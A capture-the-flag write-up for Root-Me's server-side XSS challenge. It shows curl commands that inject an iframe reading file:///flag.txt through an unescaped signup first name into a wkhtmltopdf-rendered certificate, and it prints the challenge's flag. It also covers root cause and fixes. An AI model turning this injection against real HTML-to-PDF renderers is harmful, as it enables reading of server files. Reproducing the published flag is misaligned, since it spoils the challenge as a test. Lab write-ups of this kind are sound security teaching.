# Root-Me — Web-Server: XSS - Server Side (ch83) — SOLVED

**Target:** `http://challenge01.root-me.org/web-serveur/ch83/` → 301 → `http://challenge01.root-me.org:59083/`
**Challenge:** "Who said XSS was only for the client side?" (20 pts, author Elf, HackDay 2023)
**Goal:** The flag is in `/flag.txt`.

## Flag

```
s3rv3r_s1d3_xss_1s_w4y_m0r3_fun
```

(31 characters, verified byte-exact from the generated PDF.)

## Exploit

The `text` box is properly escaped — but the **first name from signup is not**, and it is
rendered into the same certificate:

```bash
B=http://challenge01.root-me.org:59083
U=attacker$RANDOM

# 1. register — NOTE: password must be EMPTY (see below)
curl -s -c cj.txt -b cj.txt -X POST "$B/signup.php" \
  --data-urlencode "login=$U" \
  --data-urlencode 'firstname=<iframe src="file:///flag.txt"></iframe>' \
  --data-urlencode "lastname=LN" --data-urlencode "password="

# 2. log in
curl -s -c cj.txt -b cj.txt -X POST "$B/login.php" \
  --data-urlencode "login=$U" --data-urlencode "password="

# 3. generate the certificate -> the PDF contains the flag
curl -s -b cj.txt -X POST "$B/generate.php" --data-urlencode "text=x" -o out.pdf
```

PDF text:

```
We, Root-Me, certify that M.
s3rv3r_s1d3_xss_1s_w4y_m0r3_fun
 LN is a member of the Root-Me community and is active on our platform.
```

The `<script>`-wrapped variant works too:

```html
<script>document.write('<iframe src="file:///flag.txt"></iframe>')</script>
```

## Step by step

### 1. Identify the renderer
Posting `text=<b>BOLDMARKER</b>` to `/generate.php` returns a PDF whose metadata reads:

```
/Creator (wkhtmltopdf 0.12.5)
/Producer (Qt 4.8.7)
```

wkhtmltopdf is a **headless WebKit browser** — a server-side HTML/JS engine. That is the
"server side" in the challenge name.

### 2. Confirm `text` is genuinely escaped (and how)
The tags came back as literal text, so I fingerprinted the escaping:

| Input | Rendered in PDF | Conclusion |
|---|---|---|
| `Q"W'E&R>T<U` | `Q"W'E&R>T<U` | all five are escaped (`&lt;` etc. → rendered back) |
| `pre&lt;b&gt;ENC&lt;/b&gt;post` | `pre&lt;b&gt;ENC&lt;/b&gt;post` | `&` is escaped too → **single** `htmlspecialchars`, not double-decoded |
| `%C0%BC` (overlong `<`) | `\uFFFD` | `ENT_SUBSTITUTE` active, invalid UTF-8 destroyed |
| `%FF`, `%C1%9C`, `%E0%80%BC` | `\uFFFD` | no encoding-level bypass |

So `text` is a dead end — no HTML injection, no shell injection (`$(id)`, backticks and `;`
all render literally). That is the point: the developers "escaped all user inputs" — **except
one**.

### 3. Find the unescaped input
Signup collects `login`, `firstname`, `lastname`, `password`, and the certificate begins
*"We, Root-Me, certify that M. \<name\> is a member of..."*. Registering with
`firstname=<b>BOLDFN</b>` produced **bold text** in the PDF — the name is concatenated into
the HTML template **without escaping**.

### 4. Confirm server-side JavaScript
`firstname = <script>document.write(window.location)</script>` produced:

```
We, Root-Me, certify that M.
file:///tmp/tmp_wkhtmlto_pdf_69PbqJ.html
```

Two useful facts: JavaScript **executes** during rendering, and the document is rendered from
a local temp file — i.e. the engine is in a `file://` context with local filesystem access.

### 5. Read the flag
Because the context is `file://`, an iframe can pull a local file straight into the document:

```html
<iframe src="file:///flag.txt"></iframe>
```

Both this and the `<script>document.write(...)` variant embed `/flag.txt` in the PDF.

## Practical gotcha: signup crashes on a non-empty password

Worth writing down, because it cost real time:

| `signup.php` POST body | Result |
|---|---|
| `login&firstname&lastname` | 200 — form re-rendered |
| `login&firstname&lastname&password=x` | **`curl: (52) Empty reply from server`** |
| `login&firstname&lastname&pass=x` / `pwd=x` | same crash |
| `login&firstname&lastname&password=` (**empty**) | **200 — "You have been successfully registered."** |

Any non-empty 4th field kills the connection (the password hasher appears to be broken in this
deployment). Registering with an **empty password** works fine, and login likewise only needs
`login=` + `password=`. The whole exploit is reachable despite this.

## Root cause

Two bugs, one of which is the "best practice" the developer was proud of:

1. **Inconsistent output encoding.** `text` is passed through `htmlspecialchars`; `firstname`
   is concatenated raw into the same HTML template. Escaping applied at *some* call sites is
   not escaping — this is CWE-79.
2. **HTML/JS rendering of untrusted data in a privileged context.** The escaping matters so
   much here precisely because the sink is a *browser with local file access*: `wkhtmltopdf`
   ran with JavaScript enabled and local file access permitted, so a single `<iframe>` turns
   an HTML injection into **arbitrary local file read** (CWE-22 / CWE-918-adjacent). Server-side
   XSS is usually a *bigger* impact than the client-side kind, because the browser is running
   next to the server's filesystem.

## Fix

- **Encode at the point of output, for every field.** Use a templating engine with
  autoescaping on by default (Twig/Jinja) so a forgotten call site is impossible, rather than
  remembering `htmlspecialchars()` per variable.
- **Harden the renderer.** Pass `--disable-javascript`, `--disable-local-file-access` (or run
  in a sandbox/container with no filesystem access) — either flag alone would have stopped this
  even with the encoding bug present.
- **Never let user input reach the HTML template unescaped**, and treat any
  HTML-to-PDF/image/email renderer as a browser: assume it can execute script.
